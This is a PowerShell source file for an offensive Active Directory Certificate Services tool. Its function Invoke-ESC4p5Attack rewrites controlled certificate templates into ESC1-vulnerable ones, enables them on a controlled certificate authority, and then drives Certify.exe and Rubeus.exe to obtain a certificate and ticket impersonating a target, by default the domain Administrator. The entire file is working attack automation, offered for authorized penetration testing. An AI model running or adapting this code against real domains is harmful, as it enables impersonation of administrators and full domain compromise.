function Invoke-ESC4p5Attack {
    <#
        .SYNOPSIS
        Performs an ESC4p5 attack by converting vulnerable templates to ESC1, enabling them on CAs, and executing the attack.

        .DESCRIPTION
        This function takes the output from Find-ESC4p5Combo (ESC4 disabled template + ESC5 enrollment service combinations),
        converts the vulnerable templates to ESC1 vulnerabilities using ConvertTo-ESC1, enables them on the controlled
        Certificate Authorities using Enable-Template, and then executes the ESC1 attack using Invoke-ESC1Attack.
        
        ESC4p5 attacks exploit a combination of:
        1. Control over disabled certificate templates (ESC4d)
        2. Control over enrollment services/Certificate Authorities (ESC5)
        
        The attack process:
        1. Convert the disabled template to be ESC1 vulnerable (allow SAN spoofing)
        2. Enable the template on the controlled Certificate Authority
        3. Execute the ESC1 attack to obtain a certificate impersonating a target principal
        4. Use the certificate to authenticate as the target principal

        .PARAMETER ESC4p5Result
        A result object from Find-ESC4p5Combo containing ESC4d + ESC5 enrollment service combinations.
        The object should have VulnerableTemplates, ESC4dIssues, EnrollmentServices, and ESC5EnrollmentIssues properties.

        .PARAMETER CertifyPath
        Path to Certify.exe executable. If not specified, assumes Certify.exe is in the Binaries
        folder (.\Binaries\Certify.exe).

        .PARAMETER RubeusPath
        Path to Rubeus.exe executable. If not specified, assumes Rubeus.exe is in the Binaries
        folder (.\Binaries\Rubeus.exe). Used for automatic TGT request after certificate issuance.

        .PARAMETER OutputPath
        Directory for temporary operations. Defaults to .\Output\. Note: Certificates
        are kept in memory and not saved to files.

        .PARAMETER TargetPrincipal
        DirectoryEntry object representing the security principal to impersonate in the certificate.
        If not specified, automatically discovers and uses the domain Administrator account (RID 500).

        .PARAMETER WhatIf
        Shows what attack would be performed without actually executing the conversion, enablement, or attack.

        .INPUTS
        PSCustomObject
        ESC4p5 result objects from Find-ESC4p5Combo function.

        .OUTPUTS
        PSCustomObject[]
        Returns attack results for each vulnerable template/CA combination that was attacked.

        .EXAMPLE
        # Find ESC4p5 vulnerabilities and attack them
        $esc4p5Results = Find-ESC4p5Combo -Issues $AllIssues
        $esc4p5Results | Invoke-ESC4p5Attack

        .EXAMPLE
        # Attack with specific target principal
        $targetUser = Resolve-Principal -Identity "Administrator"
        $esc4p5Results = Find-ESC4p5Combo -Issues $AllIssues
        Invoke-ESC4p5Attack -ESC4p5Result $esc4p5Results[0] -TargetPrincipal $targetUser

        .EXAMPLE
        # Use WhatIf to see what would happen
        $esc4p5Results = Find-ESC4p5Combo -Issues $AllIssues
        Invoke-ESC4p5Attack -ESC4p5Result $esc4p5Results[0] -WhatIf

        .NOTES
        WARNING: This function performs actual certificate attacks that can compromise security.
        Only use in authorized penetration testing or red team exercises.
        
        Requires:
        - Certify.exe (https://github.com/GhostPack/Certify/releases) placed in .\Binaries\ folder
        - Rubeus.exe (https://github.com/GhostPack/Rubeus/releases) placed in .\Binaries\ folder
        - Network access to Certificate Authority
        - Appropriate permissions to modify certificate templates and CA configurations
        - Appropriate permissions to enroll certificates
        
        Download Certify.exe and Rubeus.exe and place them in the Binaries folder before using this function.

        .LINK
        https://posts.specterops.io/certified-pre-owned-d95910965cd2
    #>
    [CmdletBinding(SupportsShouldProcess)]
    param (
        [Parameter(Mandatory, ValueFromPipeline)]
        [ValidateNotNull()]
        [PSCustomObject]$ESC4p5Result,
        
        [Parameter()]
        [string]$CertifyPath = ".\Binaries\Certify.exe",
        
        [Parameter()]
        [string]$RubeusPath = ".\Binaries\Rubeus.exe",
        
        [Parameter()]
        [string]$OutputPath = "./Output/",
        
        [Parameter()]
        [System.DirectoryServices.DirectoryEntry]$TargetPrincipal
    )

    #requires -Version 7.4

    begin {
        Write-Verbose "[$(Get-Date -Format 'yyyy-MM-dd hh:mm:ss')] Starting $($MyInvocation.MyCommand) on $env:COMPUTERNAME..."
        
        # Validate that we have the required tools for the attack
        if (-not $WhatIfPreference) {
            if (-not (Test-Path -Path $CertifyPath)) {
                throw "Certify.exe not found at: $CertifyPath. Please download from https://github.com/GhostPack/Certify/releases"
            }
            
            if (-not (Test-Path -Path $RubeusPath)) {
                throw "Rubeus.exe not found at: $RubeusPath. Please download from https://github.com/GhostPack/Rubeus/releases"
            }
        }
        
        # Initialize results array
        $attackResults = @()
        
        # Get all ADCS objects for CA lookups
        Write-Verbose "Getting AD CS objects for CA DirectoryEntry lookups..."
        try {
            $AdcsObjects = Get-AdcsObjects
            Write-Verbose "Retrieved $($AdcsObjects.Count) AD CS objects"
        } catch {
            throw "Failed to get AD CS objects: $($_.Exception.Message)"
        }
    }

    process {
        Write-Verbose "Processing ESC4p5 result for principal: $($ESC4p5Result.PrincipalName)"
        
        # Validate input object structure
        if (-not $ESC4p5Result.PSObject.Properties['ESC4dIssues'] -or 
            -not $ESC4p5Result.PSObject.Properties['ESC5EnrollmentIssues'] -or
            -not $ESC4p5Result.PSObject.Properties['VulnerableTemplates'] -or
            -not $ESC4p5Result.PSObject.Properties['EnrollmentServices']) {
            Write-Warning "Invalid ESC4p5Result object. Expected properties: ESC4dIssues, ESC5EnrollmentIssues, VulnerableTemplates, EnrollmentServices"
            return
        }
        
        if ($ESC4p5Result.ESC4dIssues.Count -eq 0 -or $ESC4p5Result.ESC5EnrollmentIssues.Count -eq 0) {
            Write-Warning "No ESC4d or ESC5 enrollment issues found in result object for principal: $($ESC4p5Result.PrincipalName)"
            return
        }
        
        Write-Host "=== ESC4p5 Attack: $($ESC4p5Result.PrincipalName) ===" -ForegroundColor Red
        Write-Host "Found $($ESC4p5Result.ESC4dIssues.Count) vulnerable template(s): $($ESC4p5Result.VulnerableTemplates -join ', ')" -ForegroundColor Yellow
        Write-Host "Found $($ESC4p5Result.ESC5EnrollmentIssues.Count) controlled enrollment service(s): $($ESC4p5Result.EnrollmentServices -join ', ')" -ForegroundColor Yellow
        Write-Host ""
        
        # Process each vulnerable template with each controlled enrollment service
        foreach ($templateName in $ESC4p5Result.VulnerableTemplates) {
            foreach ($serviceName in $ESC4p5Result.EnrollmentServices) {
                Write-Host "Attacking template: $templateName via CA: $serviceName" -ForegroundColor Cyan
                
                # Find the corresponding ESC4d issue for this template
                $templateIssue = $ESC4p5Result.ESC4dIssues | Where-Object { 
                    $_.DirectoryEntry -and $_.DirectoryEntry.Properties['name'].Value -eq $templateName 
                } | Select-Object -First 1
                
                if (-not $templateIssue) {
                    Write-Warning "Could not find ESC4d issue for template: $templateName"
                    continue
                }
                
                if (-not $templateIssue.DirectoryEntry) {
                    Write-Warning "No DirectoryEntry found for template: $templateName"
                    continue
                }
                
                # Find the corresponding ESC5 enrollment service issue
                $serviceIssue = $ESC4p5Result.ESC5EnrollmentIssues | Where-Object { $_.Name -eq $serviceName } | Select-Object -First 1
                
                if (-not $serviceIssue) {
                    Write-Warning "Could not find ESC5 enrollment issue for service: $serviceName"
                    continue
                }
                
                # Find the CA DirectoryEntry object from ADCS objects
                $caDirectoryEntry = $AdcsObjects | Where-Object { 
                    $_.ObjectClass -eq 'pKIEnrollmentService' -and $_.Properties['name'].Value -eq $serviceName 
                } | Select-Object -First 1
                
                if (-not $caDirectoryEntry) {
                    Write-Warning "Could not find DirectoryEntry for CA: $serviceName"
                    continue
                }
                
                $templateDirectoryEntry = $templateIssue.DirectoryEntry
                
                try {
                    Write-Host "  Step 1: Converting template to ESC1 vulnerability..." -ForegroundColor Yellow
                    
                    if ($PSCmdlet.ShouldProcess("Template: $templateName", "Convert to ESC1")) {
                        # Convert the template to ESC1 vulnerable
                        $convertResult = ConvertTo-ESC1 -InputObject $templateDirectoryEntry -PassThru
                        
                        if ($convertResult) {
                            Write-Host "  [+] Successfully converted template to ESC1" -ForegroundColor Green
                            
                            Write-Host "  Step 2: Enabling template on Certificate Authority..." -ForegroundColor Yellow
                            
                            # Enable the template on the controlled CA
                            $enableResult = Enable-Template -Template $convertResult -CertificateAuthority $caDirectoryEntry -PassThru
                            
                            if ($enableResult -and ($enableResult.Success -or $enableResult.Action -eq "Already Enabled")) {
                                $enableAction = $enableResult.Action -or "Enabled"
                                Write-Host "  [+] Successfully enabled template on CA ($enableAction)" -ForegroundColor Green
                                
                                Write-Host "  Step 3: Getting CA full name..." -ForegroundColor Yellow
                                
                                # Get the CA full name for Certify.exe
                                $caFullName = Get-CAFullName -CAObjects $caDirectoryEntry
                                
                                if ($caFullName) {
                                    Write-Host "  [+] CA full name: $caFullName" -ForegroundColor Green
                                    
                                    Write-Host "  Step 4: Executing ESC1 attack..." -ForegroundColor Yellow
                                    
                                    # Build parameters for Invoke-ESC1Attack
                                    $esc1Params = @{
                                        TemplateObject = $convertResult
                                        CertificateAuthority = $caFullName
                                        CertifyPath = $CertifyPath
                                        RubeusPath = $RubeusPath
                                        OutputPath = $OutputPath
                                    }
                                    
                                    # Add optional parameters if provided
                                    if ($TargetPrincipal) {
                                        $esc1Params.TargetPrincipal = $TargetPrincipal
                                    }
                                    
                                    # Execute the ESC1 attack
                                    $attackResult = Invoke-ESC1Attack @esc1Params
                                    
                                    if ($attackResult) {
                                        Write-Host "  [+] ESC1 attack completed successfully" -ForegroundColor Green
                                        
                                        # Create comprehensive result object
                                        $resultObject = [PSCustomObject]@{
                                            PSTypeName = 'ESC4p5_Attack_Result'
                                            PrincipalName = $ESC4p5Result.PrincipalName
                                            PrincipalSID = $ESC4p5Result.PrincipalSID
                                            TemplateName = $templateName
                                            CertificateAuthority = $serviceName
                                            CAFullName = $caFullName
                                            AttackType = "ESC4p5"
                                            ConversionSuccess = $true
                                            EnablementSuccess = $true
                                            AttackSuccess = $true
                                            AttackResult = $attackResult
                                            TargetPrincipal = $TargetPrincipal
                                            Timestamp = Get-Date
                                            ErrorMessage = $null
                                        }
                                        
                                        $attackResults += $resultObject
                                        Write-Host "  [+] Attack result stored" -ForegroundColor Green
                                    } else {
                                        Write-Host "  [x] ESC1 attack failed or returned no result" -ForegroundColor Red
                                        
                                        $resultObject = [PSCustomObject]@{
                                            PSTypeName = 'ESC4p5_Attack_Result'
                                            PrincipalName = $ESC4p5Result.PrincipalName
                                            PrincipalSID = $ESC4p5Result.PrincipalSID
                                            TemplateName = $templateName
                                            CertificateAuthority = $serviceName
                                            CAFullName = $caFullName
                                            AttackType = "ESC4p5"
                                            ConversionSuccess = $true
                                            EnablementSuccess = $true
                                            AttackSuccess = $false
                                            AttackResult = $null
                                            TargetPrincipal = $TargetPrincipal
                                            Timestamp = Get-Date
                                            ErrorMessage = "ESC1 attack failed or returned no result"
                                        }
                                        
                                        $attackResults += $resultObject
                                    }
                                } else {
                                    Write-Host "  [x] Failed to get CA full name" -ForegroundColor Red
                                    
                                    $resultObject = [PSCustomObject]@{
                                        PSTypeName = 'ESC4p5_Attack_Result'
                                        PrincipalName = $ESC4p5Result.PrincipalName
                                        PrincipalSID = $ESC4p5Result.PrincipalSID
                                        TemplateName = $templateName
                                        CertificateAuthority = $serviceName
                                        CAFullName = $null
                                        AttackType = "ESC4p5"
                                        ConversionSuccess = $true
                                        EnablementSuccess = $true
                                        AttackSuccess = $false
                                        AttackResult = $null
                                        TargetPrincipal = $TargetPrincipal
                                        Timestamp = Get-Date
                                        ErrorMessage = "Failed to get CA full name"
                                    }
                                    
                                    $attackResults += $resultObject
                                }
                            } else {
                                $errorMsg = if ($enableResult -and $enableResult.Error) { $enableResult.Error } else { "Unknown error enabling template" }
                                Write-Host "  [x] Failed to enable template on CA: $errorMsg" -ForegroundColor Red
                                
                                $resultObject = [PSCustomObject]@{
                                    PSTypeName = 'ESC4p5_Attack_Result'
                                    PrincipalName = $ESC4p5Result.PrincipalName
                                    PrincipalSID = $ESC4p5Result.PrincipalSID
                                    TemplateName = $templateName
                                    CertificateAuthority = $serviceName
                                    CAFullName = $null
                                    AttackType = "ESC4p5"
                                    ConversionSuccess = $true
                                    EnablementSuccess = $false
                                    AttackSuccess = $false
                                    AttackResult = $null
                                    TargetPrincipal = $TargetPrincipal
                                    Timestamp = Get-Date
                                    ErrorMessage = if ($enableResult -and $enableResult.Error) { $enableResult.Error } else { "Failed to enable template on CA" }
                                }
                                
                                $attackResults += $resultObject
                            }
                        } else {
                            Write-Host "  [x] Failed to convert template to ESC1" -ForegroundColor Red
                            
                            $resultObject = [PSCustomObject]@{
                                PSTypeName = 'ESC4p5_Attack_Result'
                                PrincipalName = $ESC4p5Result.PrincipalName
                                PrincipalSID = $ESC4p5Result.PrincipalSID
                                TemplateName = $templateName
                                CertificateAuthority = $serviceName
                                CAFullName = $null
                                AttackType = "ESC4p5"
                                ConversionSuccess = $false
                                EnablementSuccess = $false
                                AttackSuccess = $false
                                AttackResult = $null
                                TargetPrincipal = $TargetPrincipal
                                Timestamp = Get-Date
                                ErrorMessage = "Failed to convert template to ESC1"
                            }
                            
                            $attackResults += $resultObject
                        }
                    } else {
                        Write-Host "  [i] WhatIf: Would convert template $templateName to ESC1, enable on CA $serviceName, and execute attack" -ForegroundColor Gray
                        
                        $resultObject = [PSCustomObject]@{
                            PSTypeName = 'ESC4p5_Attack_Result'
                            PrincipalName = $ESC4p5Result.PrincipalName
                            PrincipalSID = $ESC4p5Result.PrincipalSID
                            TemplateName = $templateName
                            CertificateAuthority = $serviceName
                            CAFullName = $null
                            AttackType = "ESC4p5"
                            ConversionSuccess = $null
                            EnablementSuccess = $null
                            AttackSuccess = $null
                            AttackResult = $null
                            TargetPrincipal = $TargetPrincipal
                            Timestamp = Get-Date
                            ErrorMessage = "WhatIf simulation"
                        }
                        
                        $attackResults += $resultObject
                    }
                    
                } catch {
                    Write-Host "  [x] Error during ESC4p5 attack: $($_.Exception.Message)" -ForegroundColor Red
                    Write-Verbose "Full error details: $($_.Exception | Format-List * | Out-String)"
                    
                    $resultObject = [PSCustomObject]@{
                        PSTypeName = 'ESC4p5_Attack_Result'
                        PrincipalName = $ESC4p5Result.PrincipalName
                        PrincipalSID = $ESC4p5Result.PrincipalSID
                        TemplateName = $templateName
                        CertificateAuthority = $serviceName
                        CAFullName = $null
                        AttackType = "ESC4p5"
                        ConversionSuccess = $false
                        EnablementSuccess = $false
                        AttackSuccess = $false
                        AttackResult = $null
                        TargetPrincipal = $TargetPrincipal
                        Timestamp = Get-Date
                        ErrorMessage = $_.Exception.Message
                    }
                    
                    $attackResults += $resultObject
                }
                
                Write-Host ""
            }
        }
    }

    end {
        Write-Verbose "ESC4p5 attack processing complete. Processed $($attackResults.Count) template/CA combination(s)"
        
        if ($attackResults.Count -gt 0) {
            $successfulAttacks = ($attackResults | Where-Object { $_.AttackSuccess -eq $true }).Count
            $failedAttacks = ($attackResults | Where-Object { $_.AttackSuccess -eq $false }).Count
            $whatIfAttacks = ($attackResults | Where-Object { $null -eq $_.AttackSuccess }).Count
            
            Write-Verbose "Attack Summary:"
            Write-Verbose "  Successful attacks: $successfulAttacks"
            Write-Verbose "  Failed attacks: $failedAttacks"
            Write-Verbose "  WhatIf simulations: $whatIfAttacks"
            
            # Summary by template
            $templateSummary = $attackResults | Group-Object TemplateName
            Write-Verbose "Template Attack Summary:"
            foreach ($template in $templateSummary) {
                $successful = ($template.Group | Where-Object { $_.AttackSuccess -eq $true }).Count
                $total = $template.Count
                Write-Verbose "  Template '$($template.Name)': $successful/$total successful attacks"
            }
        }
        
        Write-Verbose "[$(Get-Date -Format 'yyyy-MM-dd hh:mm:ss')] Finishing $($MyInvocation.MyCommand) on $env:COMPUTERNAME..."
        
        # Return the attack results
        return $attackResults
    }
}